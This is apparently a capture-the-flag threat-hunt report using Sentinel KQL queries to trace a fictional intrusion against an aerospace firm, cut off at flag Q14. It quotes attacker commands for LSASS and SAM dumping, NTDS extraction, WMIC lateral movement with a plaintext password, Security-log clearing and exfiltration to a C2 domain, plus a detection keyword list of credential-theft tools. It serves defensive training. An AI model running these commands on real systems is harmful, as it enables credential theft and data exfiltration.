> **CONFIDENTIAL — THREAT HUNT REPORT**

# Operation Silent Corridor

| Field | Detail |
|---|---|
| **Analyst** | umraffer32 |
| **Organisation** | Haldric Aerospace // Engineering Segment |
| **Date** | 10 May 2026 |
| **Hunt Type** | Proactive / CTF (LIVEHunt 04) |
| **Threat Actor** | GREY VEIL |
| **Status** | COMPLETE — 38 / 38 flags confirmed (Q00–Q37) |

---

## Executive Summary

GREY VEIL, a state-sponsored actor assessed to conduct intellectual property theft against European aerospace and defence contractors, executed a 13-day intrusion against Haldric Aerospace's engineering segment between 20 February and 5 March 2026. Initial access was gained via stolen VPN credentials for `s.brandt`, with the attacker authenticating from four distinct source IPs — including Tor exit nodes — before establishing a beachhead on engineering workstation `WS-ENG04`. The attacker conducted staged AD reconnaissance, escalated to domain credentials (`m.richter`) through systematic credential harvesting, then moved laterally to the file server and domain controller via WMIC remote execution, extracting the full Active Directory database using `ntdsutil IFM` — though the NTDS dump's external egress is not directly evidenced in the data (see Q35/Q36). The primary objective — the `A400M_NavSys` navigational systems directory — was compressed, base64-encoded, and exfiltrated via `Invoke-WebRequest` POST to a C2 domain masquerading as a CDN telemetry endpoint. A bidirectional `netsh portproxy` relay persisted in the registry across both `WS-ENG04` and `SRV-DC01`; March 3 process telemetry on `WS-ENG04` shows repeated admin/domain-user enumeration with no concurrent attacker-pattern FortiGate VPN session, consistent with relay-backed access but not a packet-level proof of ingress path. At 02:45 AM on March 4, a `certutil -urlcache` beacon retrieved instructions from the same C2 domain before a fresh VPN reentry at 04:20 AM. The attacker also swept `wevtutil cl Security` across all three hosts during the Feb 23/Feb 28 cleanup activity — but Sysmon telemetry, writing to a separate channel, survived intact and provides the full evidentiary basis for this hunt.

---

## Key Impact Metrics

| Metric | Value |
|---|---|
| **Dwell Time** | ~13 days (20 Feb – 5 Mar 2026) |
| **Hosts Affected** | 3 — `WS-ENG04`, `SRV-FILES02`, `SRV-DC01` |
| **Accounts Compromised** | 2 — `s.brandt` (initial access), `m.richter` (lateral movement) |
| **Data Exfiltrated** | `A400M_NavSys` directory (A400M navigational systems) |
| **Exfil Method** | `Compress-Archive` → `certutil -encode` → `Invoke-WebRequest` POST |
| **Exfil Destination** | `cdn-telemetry.cloud-endpoint.net` |
| **Threat Actor** | GREY VEIL |
| **Total Flags** | 38 / 38 confirmed (Q00–Q37) |

---

## Environment

| Field | Value |
|---|---|
| **Platform** | Microsoft Sentinel |
| **Log Table** | `SilentCorridorX_CL` |
| **Total Events** | 8,538 |
| **Attack Window** | 20 Feb – 5 Mar 2026 |
| **Target** | Haldric Aerospace — Engineering Segment |
| **Hunt Format** | LIVEHunt 04 (CTF) |

*Note: the attack window above is the assessed intrusion range, not the raw dataset range. The final attacker-pattern VPN session is a short Mar 5 connection from `185.220.101.34`; the last logged attacker command discussed in this report is the Mar 4 `certutil -urlcache` beacon/reentry sequence (see Q28/Q31).*

---

## Host Inventory

| Host | Role | Accounts Active | Notes |
|---|---|---|---|
| `WS-ENG04` | Engineering workstation / Beachhead | `s.brandt` | VPN entry point; portproxy relay initiator; WMIC lateral movement source; exfil origin |
| `SRV-FILES02` | File server | `m.richter` | `A400M_NavSys` data compressed and encoded here; Security log cleared |
| `SRV-DC01` | Domain controller | `m.richter` | NTDS dump via `ntdsutil IFM`; portproxy relay endpoint; Security log cleared |

---

## Attack Narrative

GREY VEIL first tested `s.brandt`'s VPN credentials on 19 February — an `ssl-login-fail` at 11:47 PM from Tor exit node `185.220.101.34`, then success at 2:14 AM on February 20. The session landed on `WS-ENG04`, the beachhead for the entire operation.

Reconnaissance followed in deliberate stages. Minutes after first access, `systeminfo.exe` profiled the host. On February 23, `net group` enumerated `Domain Admins` and `Enterprise Admins`, DNS resolved `SRV-DC01` and `SRV-FILES02`, and `wevtutil cl Security` cleared the local event log — operational discipline before the main objective was in reach.

Credential harvesting ran across February 26–27: a `comsvcs.dll MiniDump` against LSASS failed silently (malformed `tasklist` returned a bad PID), so the attacker swept every other local surface — `HKLM\SAM` saved twice, `cmdkey /list` run twice, PuTTY session registry queried. No security tool fired.

February 28 was a coordinated burst. WMIC remote-executed commands from `WS-ENG04` under `m.richter` began at 3:15 AM, with target-side effects following on `SRV-FILES02` and `SRV-DC01`. At 3:25 AM, `WS-ENG04` wrote a `netsh portproxy` rule to forward `0.0.0.0:8443` to `SRV-DC01.haldric.local:445`; at 4:23 AM, `SRV-DC01` wrote the mirrored `0.0.0.0:9999` rule back to `10.1.36.210:8443`. On `SRV-FILES02`, `Compress-Archive` packaged `A400M_NavSys\*` and `certutil -encode` base64'd the result; both artefacts were deleted after staging. On `SRV-DC01`, `ntdsutil IFM` extracted `ntds.dit`, `SYSTEM`, and `SECURITY` into `C:\Windows\Temp\McAfee_Logs`. Cleanup spanned the same burst: `SRV-FILES02` cleared Security at 3:33 AM, the NTDS staging directory was removed at 4:45 AM, and `SRV-DC01` cleared Security at 4:46 AM. Sysmon, on a separate channel, survived intact.

Two days later at 1:19 AM on March 2, `Invoke-WebRequest` POSTed `win_update_kb5034.b64` from `WS-ENG04` to `cdn-telemetry.cloud-endpoint.net`.

March 3 had no attacker-pattern FortiGate VPN session — yet `WS-ENG04` logged `s.brandt` recon across the day: `netstat -ano`, repeated `net`/`net1` local administrator and domain-user enumeration, and `netsh interface show interface`, running both before and after the legitimate user's brief VPN window. The timing is consistent with access through the Feb 28 persistence path, but the telemetry does not directly record the ingress route. The VPN gap was not an absence.

On March 4, `certutil -urlcache` beaconed the same C2 domain at 02:45 AM before a fresh VPN session opened from `45.153.160.88` at 04:20 AM. A final short attacker-pattern VPN session followed on March 5 at 03:05 AM from `185.220.101.34`, with no additional post-exploitation command sequence established in this report.

---

## Attack Timeline

| Date | Time | Phase | Event |
|---|---|---|---|
| Feb 19 | 11:47 PM | Initial Access | `ssl-login-fail` — `185.220.101.34` (Tor exit node) |
| Feb 20 | 2:14 AM | Initial Access | VPN success → beachhead established on `WS-ENG04` |
| Feb 23 | 1:47 AM | Reconnaissance | `net group "Domain Admins"` / `"Enterprise Admins"`; DNS resolution of `SRV-DC01`, `SRV-FILES02` |
| Feb 23 | 11:01 AM | Defense Evasion | `wevtutil cl Security` — early wipe on `WS-ENG04` |
| Feb 26 | 2:38 AM | Credential Access | `tasklist` → `comsvcs.dll MiniDump` against LSASS (failed — bad PID) |
| Feb 27 | 12:20 PM | Credential Access | `reg save HKLM\SAM`; `cmdkey /list`; PuTTY registry query |
| Feb 28 | 3:15 AM | Lateral Movement | WMIC `process list brief` → `SRV-DC01` as `m.richter` |
| Feb 28 | 3:18 AM | Collection | `Compress-Archive A400M_NavSys\*` + `certutil -encode` on `SRV-FILES02` |
| Feb 28 | 3:25 AM | Persistence | `netsh portproxy` relay: `WS-ENG04:8443 → DC01:445`; registry write to `HKLM\...\PortProxy\v4tov4\tcp` |
| Feb 28 | 4:18 AM | Credential Access | `ntdsutil IFM` → `C:\Windows\Temp\McAfee_Logs` on `SRV-DC01` |
| Feb 28 | 4:23 AM | Persistence | Mirror portproxy on `SRV-DC01`: `0.0.0.0:9999 → 10.1.36.210:8443` |
| Feb 28 | 3:33–4:46 AM | Defense Evasion | `wevtutil cl Security` on `SRV-FILES02` and `SRV-DC01`; `McAfee_Logs` staging dir deleted at 4:45 AM |
| Mar 2 | 1:19 AM | Exfiltration | `Invoke-WebRequest` POST → `cdn-telemetry.cloud-endpoint.net` |
| Mar 3 | 7:06 AM–3:17 PM | Persistence-Driven Recon | `WS-ENG04` recon with no attacker-pattern FortiGate VPN: `netstat -ano`, `net localgroup`, `net user /dom`, `netsh interface show interface` |
| Mar 4 | 2:45 AM | C2 | `certutil -urlcache` beacon → `cdn-telemetry.cloud-endpoint.net` before the next attacker-pattern VPN session |
| Mar 4 | 4:20 AM | Reentry | Attacker VPN session: `45.153.160.88` → tunnel `10.1.96.114` |
| Mar 5 | 3:05 AM | Reentry | Final attacker-pattern VPN session: `185.220.101.34` → tunnel `10.1.96.114` |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Initial Access | Valid Accounts | T1078 | `s.brandt` VPN credentials used from 4 source IPs |
| Discovery | System Information Discovery | T1082 | `systeminfo.exe` on `WS-ENG04` at first access |
| Discovery | Account Discovery: Domain Account | T1087.002 | `net group "Domain Admins"` / `"Enterprise Admins"` |
| Discovery | Remote System Discovery | T1018 | DNS resolution of `SRV-DC01`, `SRV-FILES02` post-enum |
| Credential Access | OS Credential Dumping: LSASS Memory | T1003.001 | `comsvcs.dll MiniDump` attempt (failed) on `WS-ENG04` |
| Credential Access | OS Credential Dumping: SAM | T1003.002 | `reg save HKLM\SAM C:\Windows\Temp\sam.bak` |
| Credential Access | OS Credential Dumping: NTDS | T1003.003 | `ntdsutil IFM` on `SRV-DC01` |
| Credential Access | Credentials from Password Stores: Windows Credential Manager | T1555.004 | `cmdkey  /list` on `WS-ENG04` |
| Credential Access | Credentials in Registry | T1552.002 | PuTTY sessions queried from `HKCU\Software\SimonTatham\PuTTY\Sessions` |
| Execution / Lateral Movement | Windows Management Instrumentation | T1047 | `wmic /node:"SRV-DC01" /user:"m.richter"` |
| Command and Control | Proxy: Internal Proxy | T1090.001 | `netsh portproxy` relay on `WS-ENG04` + `SRV-DC01` |
| Defense Evasion | Modify Registry | T1112 | Portproxy rules persisted to `HKLM\...\PortProxy\v4tov4\tcp` |
| Collection | Archive Collected Data: Archive via Utility | T1560.001 | `Compress-Archive` + `certutil -encode` on `SRV-FILES02` |
| Exfiltration | Exfiltration Over Web Service | T1567 | `Invoke-WebRequest` POST to `cdn-telemetry.cloud-endpoint.net` |
| Defense Evasion | Indicator Removal: Clear Windows Event Logs | T1070.001 | `wevtutil cl Security` across `WS-ENG04`, `SRV-DC01`, `SRV-FILES02` |
| Defense Evasion | Masquerading | T1036 | `McAfee_Logs` staging dir; `win_update_kb5034` filename |

---

## Cyber Kill Chain

| Phase | Activity | Hunt Flags |
|---|---|---|
| Reconnaissance | Pre-existing knowledge of Haldric VPN infrastructure and `s.brandt` credentials | — |
| Weaponisation | Credential acquisition prior to dataset window | — |
| Delivery | VPN login via stolen `s.brandt` credentials from 4 source IPs | Q01–Q05 |
| Exploitation | Beachhead established on `WS-ENG04`; AD and network reconnaissance | Q06–Q08 |
| Installation | Registry-persisted `netsh portproxy` relay on `WS-ENG04` + `SRV-DC01` | Q22–Q24 |
| Command & Control | Portproxy relay tunnel; `certutil -urlcache` beacon (March 4) | Q22–Q24, Q28 |
| Actions on Objective | NTDS dump (`SRV-DC01`); `A400M_NavSys` exfiltration (`SRV-FILES02`) | Q17–Q19, Q25–Q30 |

---

<details>
<summary><strong>Query Conventions</strong></summary>

**Base filter (every query):** `| where TimeGenerated > datetime(2026-04-07T14:00:00Z)`

Per the data dictionary: `TimeGenerated` is the **ingestion** timestamp (everything was ingested in a single batch on 2026-04-07), not when the events occurred. The filter above excludes test/seed data; the real attack window is **20 Feb – 5 Mar 2026** in the `EventTime` column.

`EventTime` is a **string**, not a datetime — sorting works (`sort by EventTime asc`), but arithmetic and time-window filters require `todatetime(EventTime)`.

Every query uses the `let HuntData = SilentCorridorX_CL | where isnotempty(EventTime) | where TimeGenerated > datetime(2026-04-07T14:00:00Z)` binding from the briefing. API calls pass `timespan_hours=2000` to ensure historical data is returned.

</details>

---

## Phase 00 — Mission Brief

<details>
<summary><strong>Q00 — Environment Access · <code>SilentCorridorX_CL</code></strong></summary>

**Goal**
Confirm workspace access and identify the custom log table name powering the Silent Corridor dataset.

**Approach**
The table name was stated directly in the mission briefing: the dataset is ingested into `SilentCorridorX_CL`, a custom log table containing all three telemetry streams — FortiGate VPN authentication logs, Sysmon endpoint telemetry (`DeviceProcessEvents`, `DeviceFileEvents`, `DeviceNetworkEvents`, `DeviceRegistryEvents`, `DeviceLogonEvents`), and Windows Security events. No query required; read the briefing.

**Flag**
`SilentCorridorX_CL`

</details>

---

## Phase 01 — Who Got In?

<details>
<summary><strong>Q01 — Suspicious Account · <code>s.brandt</code></strong></summary>

**Goal**
Identify the compromised VPN account — the one authenticating from an abnormal number of distinct source IPs.

**Approach**
Hypothesis: a hijacked account will show logins from multiple distinct source IPs while legitimate users authenticate from one consistent location. A single `dcount(RemoteIP) by AccountName` aggregation over all FortiGateVPN rows surfaced the anomaly immediately — `s.brandt` had 4 distinct source IPs while every other account (m.richter, k.weber) had exactly 1.

**Query Used**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "FortiGateVPN" and isnotempty(AccountName)
| summarize n=dcount(RemoteIP) by AccountName
| sort by n desc
```

**Results**

| AccountName | Distinct Source IPs |
|---|---|
| `s.brandt` | 4 |
| `m.richter` | 1 |
| `k.weber` | 1 |

**Flag**
`s.brandt`

**Lesson**
> Multi-source-IP VPN login patterns are a reliable first signal for credential compromise. One aggregation query is enough — the compromised account stands out immediately with no joins required.

</details>

<details>
<summary><strong>Q02 — Origin of Failed Auth · <code>185.220.101.34</code></strong></summary>

**Goal**
Identify which source IP produced the failed authentication attempt against s.brandt's VPN account.

**Approach**
Rather than jumping straight to a fail/success aggregation, pulled the full raw VPN timeline for s.brandt sorted chronologically to read the actual session pattern. `88.153.72.14` dominated with consistent daytime logins and a regular tunnel cadence — classic legitimate user behaviour, with one fat-finger fail on Feb 27 followed by a success 4 minutes later. `185.220.101.34` told a different story: its very first event was an `ssl-login-fail` at 11:47 PM on Feb 19, followed by a successful login 2+ hours later at 2:14 AM. Middle of the night, initial failure, then access — the attacker's first foothold attempt. The other two IPs logged straight in with no failures, consistent with returning with already-confirmed credentials.

**Query Used**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "FortiGateVPN" and AccountName == "s.brandt"
| project EventTime, RemoteIP, ActionType, TunnelIP, DestinationHost
| sort by EventTime asc
```

**Results** *(selected rows — full timeline spans all 4 source IPs)*

| EventTime | RemoteIP | ActionType |
|---|---|---|
| 2026-02-19 23:47 | `185.220.101.34` | ssl-login-fail |
| 2026-02-20 02:14 | `185.220.101.34` | ssl-login-success |

Only `185.220.101.34` opened with a failure — at 11:47 PM — then went silent for 2+ hours before a successful login at 2:14 AM. Every other IP authenticated directly on first attempt.

**Flag**
`185.220.101.34`

**Lesson**
> Start broad before aggregating. Pull the raw timeline first and read the session pattern — time-of-day, failure-then-success gaps, and tunnel cadence reveal attacker behaviour that a pure aggregation hides.

</details>

<details>
<summary><strong>Q03 — Connection Footprint · <code>4</code></strong></summary>

**Goal**
Determine how many distinct source IPs authenticated to VPN as s.brandt.

**Approach**
The Q02 raw timeline had already surfaced all four IPs: `88.153.72.14`, `185.220.101.34`, `91.234.33.126`, and `45.153.160.88`. Ran a `dcount(RemoteIP)` to confirm the count rather than re-derive it from scratch.

**Query Used**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "FortiGateVPN" and AccountName == "s.brandt"
| summarize dcount(RemoteIP)
```

**Results**

| dcount_RemoteIP |
|---|
| 4 |

**Flag**
`4`

</details>

<details>
<summary><strong>Q04 — Source Address Inventory · <code>45.153.160.88, 88.153.72.14, 91.234.33.126, 185.220.101.34</code></strong></summary>

**Goal**
List all distinct source IPs that authenticated to VPN as s.brandt.

**Approach**
All four IPs were already visible in the Q02 raw timeline. Ran `distinct RemoteIP` to produce the clean list and confirm nothing was missed.

**Query Used**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "FortiGateVPN" and AccountName == "s.brandt"
| distinct RemoteIP
| sort by RemoteIP asc
```

**Results**

| RemoteIP |
|---|
| `45.153.160.88` |
| `88.153.72.14` |
| `91.234.33.126` |
| `185.220.101.34` |

**Flag**
`45.153.160.88, 88.153.72.14, 91.234.33.126, 185.220.101.34`

</details>

<details>
<summary><strong>Q05 — Internal Landing Point · <code>WS-ENG04</code></strong></summary>

**Goal**
Determine which internal workstation s.brandt's VPN sessions landed on — the initial foothold host used to begin post-exploitation activity.

**Approach**
The Q02 raw timeline had already shown `DestinationHost` populated on every `ssl-login-succ` row. Rather than assuming it was uniform, ran a `distinct RemoteIP, DestinationHost` to check whether attacker IPs landed somewhere different from the legitimate user. Every IP — legitimate and attacker-controlled — resolved to `WS-ENG04`. No pivot into DeviceLogonEvents needed; the answer was already in the FortiGateVPN table.

**Query Used**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "FortiGateVPN" and AccountName == "s.brandt"
| where ActionType == "ssl-login-succ"
| distinct RemoteIP, DestinationHost
```

**Results**

| RemoteIP | DestinationHost |
|---|---|
| `45.153.160.88` | `WS-ENG04` |
| `88.153.72.14` | `WS-ENG04` |
| `91.234.33.126` | `WS-ENG04` |
| `185.220.101.34` | `WS-ENG04` |

**Flag**
`WS-ENG04`

**Lesson**
> When hunting VPN beachheads, pivot on `DestinationHost` — not `RemoteIP` or `DeviceName`. It records the internal host the session was delivered to, making a follow-on DeviceLogonEvents join unnecessary. Running the broad timeline first (Q02) surfaces field vocabulary before you need it; by Q05 the column is already familiar and the answer falls out of a single `distinct` call.

</details>

---

## Phase 02 — What Do They Know?

<details>
<summary><strong>Q06 — Initial Process · <code>systeminfo.exe/cmd.exe</code></strong></summary>

**Goal**
Identify the first non-routine process executed on WS-ENG04 after the attacker gained access.

**Approach**
Rather than pre-filtering out "routine" processes with an exclusion list, pulled the full process timeline for s.brandt on WS-ENG04 starting from the attacker's first VPN connection (Feb 20 at 2:14 AM). The very first row told the story: `systeminfo.exe` spawned by `cmd.exe` at the exact timestamp of the tunnel-up event — classic post-access system reconnaissance, no noise filtering needed.

**Query Used**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents" and DeviceName == "WS-ENG04"
| where AccountName == "s.brandt"
| where todatetime(EventTime) >= datetime(2026-02-20T02:14:00Z)
| project EventTime, FileName, ProcessCommandLine, InitiatingProcessFileName
| sort by EventTime asc
```

**Results** *(first row — anchored to the VPN tunnel-up at 2:14 AM)*

| EventTime | FileName | InitiatingProcessFileName |
|---|---|---|
| 2026-02-20 02:14 | `systeminfo.exe` | `cmd.exe` |
| *(+ subsequent process activity)* | | |

**Flag**
`systeminfo.exe/cmd.exe`

**Lesson**
> Anchoring the process query to the attacker's first VPN connection timestamp eliminates the need for a noisy exclusion list. The first row at the session start is the answer.

</details>

<details>
<summary><strong>Q07 — Directory Enumeration · <code>Domain Admins, Enterprise Admins</code></strong></summary>

**Goal**
Identify which AD groups the attacker enumerated on WS-ENG04.

**Approach**
The Q06 process timeline had already surfaced the `net group` commands on Feb 23 at 1:47 AM. Ran a focused query filtering to `net.exe` with `group` in the command line to get the clean ordered list and confirm nothing was missed. Two distinct groups appeared, each logged twice (duplicate Sysmon entries at near-identical timestamps — normal behavior).

**Query Used**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents" and DeviceName == "WS-ENG04"
| where AccountName == "s.brandt" and FileName =~ "net.exe"
| where ProcessCommandLine has "group"
| project EventTime, ProcessCommandLine
| sort by EventTime asc
```

**Results** *(each group appears twice — Sysmon double-log)*

| EventTime | ProcessCommandLine |
|---|---|
| 2026-02-23 01:47 | `net  group "Domain Admins" /domain` |
| 2026-02-23 01:47 | `net  group "Enterprise Admins" /domain` |

**Flag**
`Domain Admins, Enterprise Admins`

</details>

<details>
<summary><strong>Q08 — Network Reconnaissance · <code>SRV-DC01, SRV-FILES02</code></strong></summary>

**Goal**
Identify which internal hosts the attacker resolved via DNS after enumerating AD admin groups.

**Approach**
Pulled all DNS queries from WS-ENG04 after the AD enumeration timestamp (Feb 23 at 1:47 AM) without pre-filtering, to see the full picture. `SRV-DC01` appeared at 8:34 AM and `SRV-FILES02` at 10:45 AM — both resolved within hours of the group enumeration. The remaining queries were background noise: AWS SSM agent, Office telemetry, and later the C2 exfil domain. Only two internal SRV-* hosts were queried, and both became lateral movement targets later in the chain.

**Query Used**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where DeviceName == "WS-ENG04" and isnotempty(DnsQueryString)
| where todatetime(EventTime) > datetime(2026-02-23T01:47:48Z)
| project EventTime, DnsQueryString, DnsQueryResult
| sort by EventTime asc
```

**Results** *(selected rows — remaining queries are AWS SSM, Office telemetry, C2 domain)*

| EventTime | DnsQueryString |
|---|---|
| 2026-02-23 08:34 | `SRV-DC01` |
| 2026-02-23 10:45 | `SRV-FILES02` |
| *(+ background noise)* | |

**Flag**
`SRV-DC01, SRV-FILES02`

</details>

---

## Phase 03 — How Did They Escalate?

<details>
<summary><strong>Q09 — First Credential Activity · <code>tasklist  /fi "imagename eq lsass.exe</code></strong></summary>

**Goal**
Identify the first credential access technique executed on WS-ENG04.

**Approach**
Ran a broad technique-level hunt across known credential access keywords on WS-ENG04 rather than targeting a specific tool. The earliest hit was `tasklist  /fi "imagename eq lsass.exe` at 2:38 AM on Feb 26 — the attacker probing for LSASS's PID before a `rundll32 comsvcs.dll MiniDump` attempt 75 seconds later. Note the double space and missing closing quote — that's the literal command as logged, per the data dictionary's Windows command line quirk note.

**Query Used**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents" and DeviceName == "WS-ENG04"
| where ProcessCommandLine has_any ("lsass", "mimikatz", "sekurlsa", "MiniDump", "comsvcs",
    "reg save", "HKLM\\SAM", "HKLM\\SECURITY", "ntds", "vssadmin", "cmdkey",
    "vaultcmd", "DPAPI", "procdump", "WinSCP", "PuTTY", "Vault")
| project EventTime, FileName, ProcessCommandLine, InitiatingProcessFileName
| sort by EventTime asc
```

**Results** *(selected rows — full sweep spans Feb 26–27)*

| EventTime | FileName | ProcessCommandLine |
|---|---|---|
| 2026-02-26 02:38 | `tasklist.exe` | `tasklist  /fi "imagename eq lsass.exe` |
| 2026-02-26 02:40 | `rundll32.exe` | `rundll32  … comsvcs.dll MiniDump 628 …` |
| 2026-02-26 | `reg.exe` | `reg  query HKCU\Software\SimonTatham\PuTTY\Sessions` |
| 2026-02-27 12:20 | `reg.exe` | `reg  save HKLM\SAM C:\Windows\Temp\sam.bak` |
| 2026-02-27 | `cmdkey.exe` | `cmdkey  /list` |

**Flag**
`tasklist  /fi "imagename eq lsass.exe`

**Lesson**
> Hunt credential access with technique-surface keywords, not tool names. `has_any` across the full cred-access vocabulary surfaces the whole sequence in one query — tasklist, MiniDump, cmdkey, reg save, PuTTY — letting you read the attacker's methodology rather than chasing individual tools.

</details>

<details>
<summary><strong>Q10 — Credential Dump Outcome · <code>NO/none</code></strong></summary>

**Goal**
Determine whether the MiniDump attempt succeeded and whether any security tool intervened.

**Approach**
The Q09 hunt established that `tasklist  /fi "imagename eq lsass.exe` (malformed — missing closing quote) ran at 2:38 AM, followed by `rundll32 comsvcs.dll MiniDump 628` at 2:40 AM. A malformed tasklist would return a bad PID, making the dump likely to fail. Two questions to answer: did a `.dmp` file land on disk, and did any security tool respond?

**Query 1 — Check for .dmp file on disk**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceFileEvents" and DeviceName == "WS-ENG04"
| where todatetime(EventTime) between (datetime(2026-02-26T02:38:00Z) .. datetime(2026-02-26T03:00:00Z))
| project EventTime, FileName, FolderPath, ActionType, InitiatingProcessFileName
| sort by EventTime asc
```
**Results — Query 1**
0 rows — no `.dmp` file written to disk in the 22-minute window.

**Query 2 — Check for AV/EDR intervention**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceEvents" and DeviceName == "WS-ENG04"
| where todatetime(EventTime) between (datetime(2026-02-26T02:38:00Z) .. datetime(2026-02-26T03:00:00Z))
| project EventTime, ActionType, FileName, FolderPath
| sort by EventTime asc
```
**Results — Query 2**
0 rows — no AV alert, block, or quarantine event.

**Flag**
`NO/none`

**Lesson**
> A malformed tasklist command returned a bogus PID, causing the MiniDump to target the wrong process and fail silently. No security tool detected or blocked it — absence of a .dmp file and absence of DeviceEvents together confirm both the failure and the non-detection.

</details>

<details>
<summary><strong>Q11 — Stored Credential Source · <code>SAM</code></strong></summary>

**Goal**
Identify which registry hive the attacker saved for offline credential extraction.

**Approach**
The Q09 credential access hunt had already surfaced two `reg  save HKLM\SAM` commands on Feb 27. Ran a focused `reg save` query across WS-ENG04 to confirm no other hives were targeted. Both commands saved `HKLM\SAM` to `C:\Windows\Temp\sam.bak` — run twice (12:20 PM and 2:28 PM), no SECURITY or SYSTEM hive alongside it.

**Query Used**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents" and DeviceName == "WS-ENG04"
| where ProcessCommandLine has "reg" and ProcessCommandLine has "save"
| project EventTime, ProcessCommandLine
| sort by EventTime asc
```

**Results**

| EventTime | ProcessCommandLine |
|---|---|
| 2026-02-27 12:20 | `reg  save HKLM\SAM C:\Windows\Temp\sam.bak` |
| 2026-02-27 14:28 | `reg  save HKLM\SAM C:\Windows\Temp\sam.bak` |

**Flag**
`SAM`

</details>

<details>
<summary><strong>Q12 — Saved Credentials · <code>cmdkey  /list</code></strong></summary>

**Goal**
Identify the command used to enumerate Windows Credential Manager on WS-ENG04.

**Approach**
Ran a broad credential storage sweep across known tools and keywords — cmdkey, vaultcmd, PuTTY, WinSCP, DPAPI, Vault. Two distinct techniques surfaced: `reg query HKCU\Software\SimonTatham\PuTTY\Sessions` on Feb 26 (hunting saved SSH credentials) and `cmdkey  /list` twice on Feb 27 (enumerating Windows Credential Manager). The question targets credential manager enumeration specifically, pointing to cmdkey. Double space is as-logged.

**Query Used**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents" and DeviceName == "WS-ENG04"
| where ProcessCommandLine has_any ("cmdkey", "vaultcmd", "PuTTY", "WinSCP", "Credentials", "DPAPI", "Vault")
| project EventTime, FileName, ProcessCommandLine, InitiatingProcessFileName
| sort by EventTime asc
```

**Results**

| EventTime | FileName | ProcessCommandLine |
|---|---|---|
| 2026-02-26 | `reg.exe` | `reg  query HKCU\Software\SimonTatham\PuTTY\Sessions` |
| 2026-02-27 12:20 | `cmdkey.exe` | `cmdkey  /list` |
| 2026-02-27 14:28 | `cmdkey.exe` | `cmdkey  /list` |

**Flag**
`cmdkey  /list`

</details>

---

## Phase 04 — How Far Did They Get?

<details>
<summary><strong>Q13 — First Lateral Pivot · <code>10.1.96.114/SRV-DC01/m.richter</code></strong></summary>

**Goal**
Identify the first remote execution attempt from WS-ENG04 and the credentials used.

**Approach**
Hunted for lateral movement techniques from WS-ENG04 using a technique-level keyword sweep: WMIC `/node:`, PsExec, Invoke-Command, net use. The first hit was at 3:15 AM on Feb 28 — `wmic /node:"SRV-DC01" /user:"m.richter"` running `process list brief`, a reconnaissance check before committing to remote execution. The `10.1.96.114` source in the flag is supported by `DeviceLogonEvents` around the same activity window, where `m.richter` logons from `10.1.96.114`/`kali` appear on the target servers; FortiGate does not show a concurrent `s.brandt` VPN session at 3:15 AM. Treat the IP context as logon telemetry, not proof of an active FortiGate tunnel at that minute.

**Query Used**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents" and DeviceName == "WS-ENG04"
| where ProcessCommandLine has_any ("/node:", "Invoke-Command", "PsExec", "winrm", "net use")
| project EventTime, FileName, ProcessCommandLine, InitiatingProcessFileName
| sort by EventTime asc
```

**Results** *(first row — 6 further WMIC /node: commands follow; DeviceLogonEvents corroborate `10.1.96.114` as attacker source context)*

| EventTime | FileName | ProcessCommandLine |
|---|---|---|
| 2026-02-28 03:15 | `WMIC.exe` | `wmic  /node:"SRV-DC01" /user:"m.richter" /password:"Haldric2025SecIT" process list brief` |
| *(+ 6 further /node: commands, all bearing `/password:"Haldric2025SecIT"`)* | | |

**Flag**
`10.1.96.114/SRV-DC01/m.richter`

> **⚠️ Unreported credential:** Every WMIC command carries `/password:"Haldric2025SecIT"` in plaintext — visible verbatim in Sysmon `DeviceProcessEvents`. This is `m.richter`'s domain password, fully exposed across 7 logged commands. It does not appear in any flag but is a live IOC: the password must be treated as compromised and rotated immediately.

</details>

<details>
<summary><strong>Q14 — New Account Observed · <code>m.richter</code></strong></summary>

**Goal**
Identify the new account that appeared during lateral movement — distinct from the session owner s.brandt.

**Approach**
Q13 already surfaced m.richter in the first WMIC command. Ran the full `/node:` query to confirm no other accounts appeared across any of the seven lateral movement commands. Every execution used `/user:"m.richter"` exclusively.

**Query Used**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
